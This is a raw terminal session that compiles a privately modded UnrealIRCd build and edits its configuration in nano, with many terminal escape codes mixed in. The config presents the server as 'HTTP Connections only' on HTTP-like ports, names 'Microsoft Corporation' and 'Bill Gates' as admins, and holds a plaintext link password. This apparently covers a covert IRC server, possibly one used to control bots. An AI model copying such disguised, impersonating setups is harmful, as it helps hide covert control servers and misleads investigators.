gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_unzline.so m_unzline.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_whois.so m_whois.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_tkl.so m_tkl.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_vhost.so m_vhost.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_cycle.so m_cycle.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_svsjoin.so m_svsjoin.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_svspart.so m_svspart.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_svswatch.so m_svswatch.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_svssilence.so m_svssilence.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_sendsno.so m_sendsno.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_svssno.so m_svssno.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_sajoin.so m_sajoin.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_sapart.so m_sapart.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_samode.so m_samode.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_kick.so m_kick.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_topic.so m_topic.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_invite.so m_invite.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_list.so m_list.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_time.so m_time.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_svskill.so m_svskill.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_sjoin.so m_sjoin.c

m_sjoin.c: In function ‘m_sjoin’:

m_sjoin.c:959: warning: unknown conversion type character ‘B’ in format

m_sjoin.c:959: warning: format ‘%s’ expects type ‘char *’, but argument 7 has type ‘time_t’

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_pass.so m_pass.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_userhost.so m_userhost.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_ison.so m_ison.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_silence.so m_silence.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_knock.so m_knock.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_umode2.so m_umode2.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_squit.so m_squit.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_protoctl.so m_protoctl.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_addline.so m_addline.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_addomotd.so m_addomotd.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_wallops.so m_wallops.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_admin.so m_admin.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_globops.so m_globops.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_locops.so m_locops.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_chatops.so m_chatops.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_trace.so m_trace.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_netinfo.so m_netinfo.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_links.so m_links.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_help.so m_help.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_rules.so m_rules.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_close.so m_close.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_map.so m_map.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_eos.so m_eos.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_server.so m_server.c

m_server.c: In function ‘m_server_synch’:

m_server.c:837: warning: unknown conversion type character ‘B’ in format

m_server.c:837: warning: format ‘%s’ expects type ‘char *’, but argument 6 has type ‘time_t’

m_server.c:837: warning: unknown conversion type character ‘b’ in format

m_server.c:837: warning: format ‘%lu’ expects type ‘long unsigned int’, but argument 8 has type ‘char *’

m_server.c:837: warning: format ‘%s’ expects type ‘char *’, but argument 9 has type ‘long int’

m_server.c:837: warning: format ‘%s’ expects type ‘char *’, but argument 10 has type ‘long unsigned int’

m_server.c:837: warning: unknown conversion type character ‘b’ in format

m_server.c:837: warning: format ‘%s’ expects type ‘char *’, but argument 10 has type ‘long unsigned int’

m_server.c:860: warning: unknown conversion type character ‘B’ in format

m_server.c:860: warning: format ‘%s’ expects type ‘char *’, but argument 6 has type ‘time_t’

m_server.c:860: warning: format ‘%lu’ expects type ‘long unsigned int’, but argument 9 has type ‘char *’

m_server.c:860: warning: format ‘%s’ expects type ‘char *’, but argument 10 has type ‘long unsigned int’

m_server.c:923: warning: unknown conversion type character ‘B’ in format

m_server.c:923: warning: format ‘%s’ expects type ‘char *’, but argument 6 has type ‘time_t’

m_server.c: In function ‘send_channel_modes_sjoin3’:

m_server.c:1398: warning: unknown conversion type character ‘B’ in format

m_server.c:1398: warning: format ‘%s’ expects type ‘char *’, but argument 4 has type ‘time_t’

m_server.c:1405: warning: unknown conversion type character ‘B’ in format

m_server.c:1405: warning: format ‘%s’ expects type ‘char *’, but argument 4 has type ‘time_t’

m_server.c:1412: warning: unknown conversion type character ‘B’ in format

m_server.c:1412: warning: format ‘%s’ expects type ‘char *’, but argument 4 has type ‘time_t’

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_stats.so m_stats.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_svsfline.so m_svsfline.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_dccdeny.so m_dccdeny.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_undccdeny.so m_undccdeny.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_whowas.so m_whowas.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_connect.so m_connect.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o m_dccallow.so m_dccallow.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

	       -o m_userip.so m_userip.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

	       -o m_nick.so m_nick.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

	       -o m_user.so m_user.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

	       -o m_mode.so m_mode.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

	       -o m_watch.so m_watch.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

	       -o m_part.so m_part.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

	       -o m_join.so m_join.c

m_join.c: In function ‘_join_channel’:

m_join.c:381: warning: unknown conversion type character ‘B’ in format

m_join.c:381: warning: format ‘%s’ expects type ‘char *’, but argument 7 has type ‘time_t’

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

	       -o m_motd.so m_motd.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

	       -o m_opermotd.so m_opermotd.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

	       -o m_botmotd.so m_botmotd.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

	       -o m_lusers.so m_lusers.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared -DDYNAMIC_LINKING \

		-o cloak.so cloak.c

make[2]: Leaving directory `/home/jmap82/linux/src/modules'

make[1]: Leaving directory `/home/jmap82/linux/src'

 _________________________________________________________ 

|                                                         |

|                 Compile is now complete.                |

| _______________________________________________________ |

|                                                         |

|        UnrealIRCd - Modded by iD [uNkn0wn-Crew]         |

|             www.uNkn0wn.eu - iD@uNkn0wn.eu              |

|                       23/11/06                          |

| _______________________________________________________ |

|                                                         |

|        IT IS VERY PRIVATE, SO DO NOT DISTRIBUTE         |

|_________________________________________________________|

                                                           

]0;jmap82@JMAP2: ~/linuxjmap82@JMAP2:~/linux$ nano unrealircd.conf

[?1049h[1;24r[m(B[4l[?7h[?12l[?25h[?1h=[?1h=[?1h=[39;49m[39;49m[m(B[H[2J[0;7m(B  GNU nano 2.0.7            File: unrealircd.conf                               [3;1H[m(B##########################################################################
[4d#[4;10H__  _ _[4;28H___[4;52H___
[5d#  _   _|  \| | | ___ __  / _ \ _[40G_______    / __\_ __ _____[72G__
[6d# | | | | . ` | |/ / '_ \/ | | \ \ /\ / / '_  \  / /  | '__/ _ \ \ /\ / /
[7d# | |_| | |\  |   <| | | \ |_| /\ V  V /| | | | / /__ | | |  __/\ V  V /
[8d#  \__,_|_| \_|_|\_\_| |_|\___/  \_/\_/ |_| |_| \____/|_|  \___| \_/\_/
[9d#   ------------------------------- never heard of us? now you did! -
[10d#   ###############################################################
[11d#    \[11;18HUnrealIRCd Config by iD [uNkn0wn Crew][11;66H/
[12d#     ###########################################################
[13d#[8G\[13;22Hwww.uNkn0wn.eu - iD@uNkn0wn.eu[13;64H/[14;9H#######################################################
[18d#[9G########################################
[19d#[9G#[19;24HME Block[19;48H#
[20d#[9G########################################[22;18H[0;7m(B[ Read 268 lines (Converted from DOS format) ]
[23d^G[m(B Get Help  [0;7m(B^O[m(B WriteOut  [0;7m(B^R[m(B Read File [0;7m(B^Y[m(B Prev Page [0;7m(B^K[m(B Cut Text  [0;7m(B^C[m(B Cur Pos
[24d[0;7m(B^X[m(B Exit[14G[0;7m(B^J[m(B Justify   [0;7m(B^W[m(B Where Is  [0;7m(B^V[m(B Next Page [0;7m(B^U[m(B UnCut Text[0;7m(B^T[m(B To Spell
[3d[4d[5d[6d[7d[8d[9d[10d[11d[12d[13d[14d[15d[16d[17d[18d[19d[20d[21d7[3;21r8[9S[1;24r[13;1Hme {[14;9Hname "HTTP1.4";[15;9Hinfo "HTTP Connections only";[16;9Hnumeric 13;
[17d};
[19d#[9G########################################
[20d#[9G#[20;23HAdmin Block[20;48H#
[21d#[9G########################################
[13d[14d[15d[16d[17d[18d[19d[22d[K[20d[21d7[3;22r8[22d[9S[1;24r[14;1Hadmin {[15d "Microsoft Corporation";[16;9H"Bill Gates - Bill@microsoft.com";
[18d};
[20d#[9G########################################
[21d#[9G#[21;23HClass Block[21;48H#
[13d[14d[15d[16d[17d[18d[19d[20d[21d7[3;22r8[22d[9S[1;24r[13;1H#[9G########################################
[16dclass[16;17Hclients
[17d{[18;9Hpingfreq 90;[19;9Hmaxclients 3000;[20;9Hsendq 100000;[21;9Hrecvq 4000;
[13d[14d[15d[16d[17d[18d[19d[20d[21d7[3;22r8[22d[9S[1;24r[13;1H};
[16d#[9G########################################
[17d#[9G#[17;23HAllow Block[17;48H#
[18d#[9G########################################
[21dallow {
[13d[14d[15d[16d[17d[18d[19d[20d[21d7[2;22r8[22d[9S[1;24r[2;1H[K[13;9Hip *@*;[14;9Hhostname *@*;[15;9Hclass clients;[16;9Hmaxperip 5;
[17d};
[19d#[9G########################################
[20d#[9G#[20;22HListen Block[20;48H#
[21d#[9G########################################
[13d[14d[15d[16d[17d[18d[19d[20d[21d7[2;22r8[22d[9S[1;24r[15;1Hlisten[15;16H*:81-86;
[16dlisten *:89;
[18d#[9G########################################
[19d#[9G#[19;22HOperator Block[19;48H#
[20d#[9G########################################
[13d[14d[15d[16d[17d[18d[19d[20d[21d7[3;22r8[22d[9S[1;24r[13;1Hlink irc.death.net
[14d{[15dusername *;
[16dhostname 66.90.88.215;
[17dbind-ip *;
[18dport 8067;
[19dhub *;
[20dpassword-connect "LiNk";
[21dpassword-receive "LiNk";
[13d[14d[15d[16d[17d[18d[19d[A[A[A[A[A[A[A[A[A[A[A[Alisten *:89;
[8d[7;13H[1;71H[0;7m(BModified[7;12H[m(B          [K[7;22r[22;1H
[1;24r[21;1Hclass servers;[6;24H;[K;[K;[K;[K;[K4;2;4;44;
[22d[0;7m(BSave modified buffer (ANSWERING "No" WILL DESTROY CHANGES) ?                    [23;1H Y[m(B Yes[K
[24d[0;7m(B N[m(B No  [14G   [0;7m(B^C[m(B Cancel[K[22;62H
[0;7m(BFile Name to Write [DOS Format]: unrealircd.conf            
[23d^G[m(B Get Help[23;21H[0;7m(B^T[m(B To Files[23;41H[0;7m(BM-M[m(B Mac Format[61G[0;7m(BM-P[m(B Prepend
[24d[0;7m(B^C[m(B Cancel[17G    [0;7m(BM-D[m(B DOS Format[41G[0;7m(BM-A[m(B Append[24;61H[0;7m(BM-B[m(B Backup File[22;49H
[23d[39;49m[m(B[J[1;71H[0;7m(B        [22;30H[m(B[1K [0;7m(B[ Wrote 267 lines ][m(B[K[24;80H[24;1H[?1049l
[?1l>]0;jmap82@JMAP2: ~/linuxjmap82@JMAP2:~/linux$ ./unreal i[Kstart

 __________________________________________________ 

|                                                  |

|              Starting UnrealIRCd                 |

|     UnrealIRCd - Modded by iD [uNkn0wn-Crew]     |

|          www.uNkn0wn.eu - iD@uNkn0wn.eu          |

|--------------------------------------------------|

|     IT IS VERY PRIVATE, SO DO NOT DISTRIBUTE     |

|__________________________________________________|

                                                    

* Loading IRCd configuration ..

* unrealircd.conf:82: illegal link::class, unknown class 'servers' using default of class 'default'

* Configuration loaded without any problems ..

* Dynamic configuration initialized .. booting IRCd.

---------------------------------------------------------------------

]0;jmap82@JMAP2: ~/linuxjmap82@JMAP2:~/linux$ ./unreal startnano unrealircd.conf

[?1049h[1;24r[m(B[4l[?7h[?12l[?25h[?1h=[?1h=[?1h=[39;49m[39;49m[m(B[H[2J[0;7m(B  GNU nano 2.0.7            File: unrealircd.conf                               [3;1H[m(B##########################################################################
[4d#[4;10H__  _ _[4;28H___[4;52H___
[5d#  _   _|  \| | | ___ __  / _ \ _[40G_______    / __\_ __ _____[72G__
[6d# | | | | . ` | |/ / '_ \/ | | \ \ /\ / / '_  \  / /  | '__/ _ \ \ /\ / /
[7d# | |_| | |\  |   <| | | \ |_| /\ V  V /| | | | / /__ | | |  __/\ V  V /
[8d#  \__,_|_| \_|_|\_\_| |_|\___/  \_/\_/ |_| |_| \____/|_|  \___| \_/\_/
[9d#   ------------------------------- never heard of us? now you did! -
[10d#   ###############################################################
[11d#    \[11;18HUnrealIRCd Config by iD [uNkn0wn Crew][11;66H/
[12d#     ###########################################################
[13d#[8G\[13;22Hwww.uNkn0wn.eu - iD@uNkn0wn.eu[13;64H/[14;9H#######################################################
[18d#[9G########################################
[19d#[9G#[19;24HME Block[19;48H#
[20d#[9G########################################[22;18H[0;7m(B[ Read 267 lines (Converted from DOS format) ]
[23d^G[m(B Get Help  [0;7m(B^O[m(B WriteOut  [0;7m(B^R[m(B Read File [0;7m(B^Y[m(B Prev Page [0;7m(B^K[m(B Cut Text  [0;7m(B^C[m(B Cur Pos
[24d[0;7m(B^X[m(B Exit[14G[0;7m(B^J[m(B Justify   [0;7m(B^W[m(B Where Is  [0;7m(B^V[m(B Next Page [0;7m(B^U[m(B UnCut Text[0;7m(B^T[m(B To Spell
[3d[4d[5d[6d[7d[8d[9d[10d[11d[12d[13d[14d[15d[16d[17d[18d[19d[20d[21d7[3;21r8[9S[1;24r[13;1Hme {[14;9Hname "HTTP1.4";[15;9Hinfo "HTTP Connections only";[16;9Hnumeric 13;
[17d};
[19d#[9G########################################
[20d#[9G#[20;23HAdmin Block[20;48H#
[21d#[9G########################################
